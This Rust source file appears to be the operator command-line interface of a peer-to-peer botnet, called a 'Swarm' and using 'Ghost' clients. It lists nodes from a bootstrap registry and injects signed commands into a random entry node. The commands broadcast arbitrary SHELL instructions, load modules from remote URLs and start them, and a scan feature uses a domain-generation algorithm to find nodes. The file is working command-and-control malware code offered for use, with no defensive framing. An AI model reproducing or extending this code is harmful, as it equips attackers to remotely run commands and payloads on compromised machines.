use std::path::PathBuf;
use crate::crypto;
use crate::network::GhostClient;
use tokio_tungstenite::MaybeTlsStream;
use tokio::net::TcpStream;

pub async fn handle_keygen(output: PathBuf) {
    let pub_key = crypto::generate_key(&output);
    println!("Generated Key at: {}", output.display());
    println!("Public Key: {}", pub_key);
}

pub async fn handle_list(bootstrap: String) {
    let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Failed to connect to Bootstrap: {}", e);
            return;
        }
    };
    
    // In Mesh, we ask Bootstrap for peers
    use protocol::PeerInfo;
    match client.get_peers().await {
        Ok(peers) => {
             println!("Bootstrap Registry ({})", peers.len());
             for (i, p) in peers.iter().enumerate() {
                 println!("{}. {} ({})", i+1, p.pub_key, p.peer_address);
             }
        }
        Err(e) => eprintln!("Error fetching peers: {}", e),
    }
}

pub async fn handle_target(_bootstrap: String, _key: PathBuf, _target: String, _cmd: String) {
    println!("Direct targeting requires connecting to specific peer. Not implemented in this CLI yet.");
}

pub async fn handle_load_module(bootstrap: String, key_path: PathBuf, url: String, name: String) {
    handle_broadcast_custom(bootstrap, key_path, "LOAD_MODULE".to_string(), format!("{}|{}", url, name)).await;
}

pub async fn handle_start_module(bootstrap: String, key_path: PathBuf, name: String, args: String) {
    handle_broadcast_custom(bootstrap, key_path, "START_MODULE".to_string(), format!("{}|{}", name, args)).await;
}

pub async fn handle_broadcast(bootstrap: String, key_path: PathBuf, cmd: String) {
    println!("Broadcast Generic: {}", cmd);
    handle_broadcast_custom(bootstrap, key_path, "SHELL".to_string(), cmd).await;
}

pub async fn handle_broadcast_custom(bootstrap: String, key_path: PathBuf, action: String, params: String) {
    let key = crypto::load_key(&key_path);
    
    // 1. Connect to Bootstrap
    let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Conn Error: {}", e);
            return;
        }
    };
    
    let peers = match client.get_peers().await {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Failed to get peers: {}", e);
            return;
        }
    };
    
    if peers.is_empty() {
        println!("No nodes found.");
        return;
    }
    
    // 2. Pick Random Entry Node
    use rand::seq::SliceRandom;
    let entry = peers.choose(&mut rand::thread_rng()).unwrap();
    println!("Selected Entry: {}", entry.peer_address);
    drop(client);
    
    // 3. Connect directly to Entry Node (No proxy)
    let mut node_client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect_direct(&entry.peer_address).await {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Direct Conn Error: {}", e);
            return;
        }
    };
    
    let session_key = match node_client.handshake().await {
        Ok(k) => k,
        Err(e) => { eprintln!("Handshake Error: {}", e); return; }
    };
    
    // 4. Create Custom Payload
    use protocol::CommandPayload;
    let payload = CommandPayload {
        id: uuid::Uuid::new_v4().to_string(),
        action,
        parameters: params,
        execute_at: chrono::Utc::now().timestamp(), // Immediate
        reply_to: None, // Direct mode, no relay
    };

    if let Err(e) = node_client.inject_command(payload, &key, &session_key).await {
        eprintln!("Injection Failed: {}", e);
    } else {
        println!("Command Injected into Swarm.");
    }
}

pub async fn handle_scan() {
    use crate::discovery::ParasiticDiscovery;
    println!("* Initiating Financial-DGA Scan...");
    let discovery = ParasiticDiscovery::new();
    match discovery.run_cycle(None).await {
        Ok(peers) => {
            println!("+ Discovered {} Mesh Nodes.", peers.len());
            for (i, p) in peers.iter().enumerate() {
                println!("{}. {:?}", i+1, p);
            }
        },
        Err(e) => eprintln!("- Scan Failed: {}", e),
    }
}
